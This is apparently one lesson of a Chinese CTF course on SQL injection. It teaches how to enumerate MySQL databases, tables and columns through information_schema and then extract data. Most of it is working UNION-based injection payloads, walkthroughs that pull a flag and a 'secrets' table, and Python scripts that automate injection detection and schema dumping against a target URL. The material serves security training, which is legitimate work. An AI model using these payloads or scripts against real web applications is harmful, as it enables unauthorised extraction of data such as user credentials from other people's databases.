# Day 18：information_schema实战——数据库信息宝库

> **学习目标**：深入理解information_schema，掌握从系统表中获取数据库结构信息的方法
> 
> **学习时长**：2小时
> 
> **难度等级**：⭐⭐⭐⭐

---

## 📚 今日内容概览

1. information_schema概述
2. SCHEMATA表详解
3. TABLES表详解
4. COLUMNS表详解
5. 实战：获取完整数据库结构
6. 自动化脚本编写

---

## 一、information_schema概述

### 1.1 什么是information_schema

```
information_schema是什么：
  MySQL的系统数据库
  存储所有数据库、表、列的元数据
  包含数据库结构的描述信息
  任何用户都可以访问（权限足够时）

作用：
  - 查询数据库结构信息
  - 获取表名、列名、数据类型
  - 了解数据库系统配置
  - SQL注入中获取目标数据库信息

特点：
  - 虚拟数据库，不占用实际存储空间
  - 数据是动态生成的
  - 包含多个系统表
```

### 1.2 information_schema的重要性

```
在SQL注入中的重要性：
  1. 获取数据库名
  2. 获取表名
  3. 获取列名
  4. 获取数据类型
  5. 了解数据库结构
  
为什么重要：
  - 不知道表名和列名就无法获取数据
  - CTF题目通常不会直接告诉你表结构
  - 必须通过information_schema获取
```

### 1.3 常用系统表

```
常用系统表：
  1. SCHEMATA：所有数据库的信息
  2. TABLES：所有表的信息
  3. COLUMNS：所有列的信息
  4. ROUTINES：存储过程和函数
  5. VIEWS：视图信息
  6. TRIGGERS：触发器信息
  
核心表：
  - SCHEMATA → 获取数据库名
  - TABLES → 获取表名
  - COLUMNS → 获取列名
```

---

## 二、SCHEMATA表详解

### 2.1 SCHEMATA表结构

```
SCHEMATA表包含的列：
  - CATALOG_NAME：数据库目录名（通常为def）
  - SCHEMA_NAME：数据库名（最重要）
  - DEFAULT_CHARACTER_SET_NAME：默认字符集
  - DEFAULT_COLLATION_NAME：默认排序规则
  - SQL_PATH：SQL路径
  
核心列：
  SCHEMA_NAME → 数据库名称
```

### 2.2 查询所有数据库

```
基本查询：
  SELECT SCHEMA_NAME FROM information_schema.SCHEMATA;
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--
  
示例：
  注入：?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--
  响应：显示所有数据库名
  如：information_schema, mysql, performance_schema, ctf, security
```

### 2.3 过滤特定数据库

```
查询用户数据库（排除系统数据库）：
  SELECT SCHEMA_NAME FROM information_schema.SCHEMATA 
  WHERE SCHEMA_NAME NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys');
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA WHERE SCHEMA_NAME NOT IN ('information_schema','mysql','performance_schema')--
```

---

## 三、TABLES表详解

### 3.1 TABLES表结构

```
TABLES表包含的列：
  - TABLE_CATALOG：目录名
  - TABLE_SCHEMA：数据库名
  - TABLE_NAME：表名（最重要）
  - TABLE_TYPE：表类型（BASE TABLE或VIEW）
  - ENGINE：存储引擎
  - TABLE_ROWS：行数
  - DATA_LENGTH：数据长度
  
核心列：
  TABLE_SCHEMA → 数据库名
  TABLE_NAME → 表名
```

### 3.2 查询指定数据库的表

```
基本查询：
  SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='ctf';
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='ctf'--
  
示例：
  注入：?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'--
  响应：显示security数据库的所有表名
  如：users, products, flag, secrets
```

### 3.3 查询当前数据库的表

```
使用database()函数：
  SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=database();
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  
优点：
  不需要知道数据库名
  自动获取当前数据库的表
```

### 3.4 查询所有表

```
查询所有数据库的所有表：
  SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES;
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),3 FROM information_schema.TABLES--
  
示例：
  注入：?id=-1 UNION SELECT 1,CONCAT(TABLE_SCHEMA,':',TABLE_NAME),3 FROM information_schema.TABLES--
  响应：显示所有数据库和对应的表名
```

---

## 四、COLUMNS表详解

### 4.1 COLUMNS表结构

```
COLUMNS表包含的列：
  - TABLE_CATALOG：目录名
  - TABLE_SCHEMA：数据库名
  - TABLE_NAME：表名
  - COLUMN_NAME：列名（最重要）
  - ORDINAL_POSITION：列序号
  - COLUMN_DEFAULT：默认值
  - IS_NULLABLE：是否可空
  - DATA_TYPE：数据类型
  - CHARACTER_MAXIMUM_LENGTH：最大长度
  
核心列：
  TABLE_NAME → 表名
  COLUMN_NAME → 列名
  DATA_TYPE → 数据类型
```

### 4.2 查询指定表的列

```
基本查询：
  SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='users';
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  
示例：
  注入：?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  响应：显示users表的所有列名
  如：id, username, password, email
```

### 4.3 查询指定数据库和表的列

```
精确查询：
  SELECT COLUMN_NAME FROM information_schema.COLUMNS 
  WHERE TABLE_SCHEMA='ctf' AND TABLE_NAME='flag';
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='ctf' AND TABLE_NAME='flag'--
  
优点：
  避免不同数据库中同名表的混淆
```

### 4.4 查询列名和数据类型

```
查询详细信息：
  SELECT COLUMN_NAME, DATA_TYPE FROM information_schema.COLUMNS WHERE TABLE_NAME='users';
  
在注入中的使用：
  ?id=-1 UNION SELECT 1,CONCAT(COLUMN_NAME,':',DATA_TYPE),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  
示例：
  注入：?id=-1 UNION SELECT 1,CONCAT(COLUMN_NAME,':',DATA_TYPE),3 FROM information_schema.COLUMNS WHERE TABLE_NAME='users'--
  响应：id:int, username:varchar, password:varchar
```

---

## 五、实战：获取完整数据库结构

### 5.1 实战流程

```
完整流程：
  1. 获取所有数据库名
  2. 选择目标数据库
  3. 获取该数据库的所有表名
  4. 选择目标表
  5. 获取该表的所有列名
  6. 获取表中的数据

示例：
  1. 获取数据库名：
     ?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--
     结果：ctf, security, test
  
  2. 获取ctf数据库的表名：
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='ctf'--
     结果：users, flag, posts
  
  3. 获取flag表的列名：
     ?id=-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='ctf' AND TABLE_NAME='flag'--
     结果：id, flag_content
  
  4. 获取flag内容：
     ?id=-1 UNION SELECT 1,flag_content,3 FROM ctf.flag--
     结果：flag{information_schema_success}
```

### 5.2 练习：获取所有信息

```
题目：
  URL：http://example.com/api/data?id=1
  已知存在数字型注入，表有3列
  
步骤：
  1. 获取所有数据库：
     ?id=-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--
  
  2. 获取当前数据库的表：
     ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  
  3. 获取所有表的所有列：
     ?id=-1 UNION SELECT 1,CONCAT(TABLE_NAME,':',COLUMN_NAME),3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=database()--
  
  4. 查找flag相关的表和列：
     观察结果，找到包含flag的表和列
  
  5. 获取flag：
     ?id=-1 UNION SELECT 1,flag_column,3 FROM flag_table--
```

### 5.3 练习：复杂场景

```
题目：
  URL：http://example.com/search?q=test
  闭合方式：双引号
  
步骤：
  1. 测试闭合方式：
     ?q=test" → 报错
     ?q=test"" → 正常
  
  2. 确定列数：
     ?q=test" ORDER BY 1-- → 正常
     ?q=test" ORDER BY 2-- → 正常
     ?q=test" ORDER BY 3-- → 报错（2列）
  
  3. 获取数据库名：
     ?q=test" UNION SELECT 1,database()--
  
  4. 获取表名：
     ?q=test" UNION SELECT 1,TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA=database()--
  
  5. 获取列名：
     ?q=test" UNION SELECT 1,COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME='secrets'--
  
  6. 获取数据：
     ?q=test" UNION SELECT 1,secret FROM secrets--
```

---

## 六、自动化脚本编写

### 6.1 Python脚本示例

```
脚本功能：
  自动获取数据库结构信息
  
代码：
import requests

def get_databases(url):
    payload = "-1 UNION SELECT 1,SCHEMA_NAME,3 FROM information_schema.SCHEMATA--"
    r = requests.get(url + payload)
    databases = []
    for line in r.text.split('\n'):
        if 'schema' in line.lower() or line.strip():
            databases.append(line.strip())
    return databases

def get_tables(url, database):
    payload = f"-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='{database}'--"
    r = requests.get(url + payload)
    tables = []
    for line in r.text.split('\n'):
        if line.strip() and not 'TABLE_NAME' in line:
            tables.append(line.strip())
    return tables

def get_columns(url, table):
    payload = f"-1 UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.COLUMNS WHERE TABLE_NAME='{table}'--"
    r = requests.get(url + payload)
    columns = []
    for line in r.text.split('\n'):
        if line.strip() and not 'COLUMN_NAME' in line:
            columns.append(line.strip())
    return columns

# 使用示例
url = "http://example.com/user?id="
dbs = get_databases(url)
print("数据库列表：", dbs)

for db in dbs:
    tables = get_tables(url, db)
    print(f"\n{db} 的表：", tables)
    
    for table in tables:
        columns = get_columns(url, table)
        print(f"  {table} 的列：", columns)

注意：
  实际使用时需要根据目标调整解析逻辑
```

### 6.2 脚本优化

```
优化方向：
  1. 添加错误处理
  2. 自动识别注入类型
  3. 自动判断列数
  4. 添加进度显示
  5. 支持多种闭合方式
  
示例优化：
import requests

def test_injection(url):
    # 测试数字型注入
    r1 = requests.get(url + "1 AND 1=1--")
    r2 = requests.get(url + "1 AND 1=2--")
    if len(r1.text) != len(r2.text):
        return "numeric"
    
    # 测试字符型注入
    r3 = requests.get(url + "admin'--")
    if "error" in r3.text.lower():
        return "string_single"
    
    r4 = requests.get(url + 'admin"--')
    if "error" in r4.text.lower():
        return "string_double"
    
    return None
```

---

## 七、常见问题解决

### 7.1 问题1：information_schema被限制

```
现象：
  查询information_schema时没有结果或报错

解决方法：
  1. 检查权限：可能用户权限不足
  2. 使用其他方法：
     - SHOW DATABASES
     - SHOW TABLES
     - SHOW COLUMNS FROM table
  
示例：
  ?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.SCHEMATA),3--
  如果不行，尝试：
  ?id=-1; SHOW DATABASES--
```

### 7.2 问题2：GROUP_CONCAT长度限制

```
现象：
  返回的结果被截断

解决方法：
  1. 修改GROUP_CONCAT的长度限制：
     SET GLOBAL group_concat_max_len = 102400;
  2. 分段查询：
     使用LIMIT和OFFSET分页
  
示例：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES LIMIT 0,10--
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES LIMIT 10,10--
```

### 7.3 问题3：特殊字符处理

```
现象：
  数据库名或表名包含特殊字符导致报错

解决方法：
  1. 使用反引号包裹：`database-name`
  2. 使用十六进制编码
  
示例：
  ?id=-1 UNION SELECT 1,TABLE_NAME,3 FROM information_schema.TABLES WHERE TABLE_SCHEMA=0x637466--
  0x637466是ctf的十六进制编码
```

---

## 八、今日总结

### 8.1 知识点回顾

```
✅ information_schema概述
  - 系统数据库
  - 存储元数据
  
✅ SCHEMATA表
  - 获取数据库名
  - SCHEMA_NAME列
  
✅ TABLES表
  - 获取表名
  - TABLE_SCHEMA和TABLE_NAME列
  
✅ COLUMNS表
  - 获取列名
  - COLUMN_NAME列
  
✅ 实战流程
  - 获取数据库→表→列→数据
  
✅ 自动化脚本
  - Python脚本示例
```

### 8.2 关键记忆点

```
记住这个口诀：

information_schema是宝库，数据库结构全清楚；
SCHEMATA找库名，TABLES找表名，COLUMNS找列名；
一步一步来，数据轻松拿！

流程：
  SCHEMATA → TABLES → COLUMNS → 数据
```

### 8.3 今日作业

```
必做题：
  1. 完成实战练习
  2. 记录完整流程
  3. 获取Flag

选做题：
  1. 编写自动化脚本
  2. 练习不同闭合方式
  3. 在CTFHub找题目练习

提交内容：
  - 注入步骤记录
  - Flag截图
  - 脚本代码（选做）
```

### 8.4 明日预告

```
Day 19：爆表名和字段名

学习内容：
  - 高效获取表名和字段名
  - 常用技巧总结
  - 实战练习
```

---

**恭喜你完成Day 18的学习！明天学习爆表名和字段名技巧！** 🎉
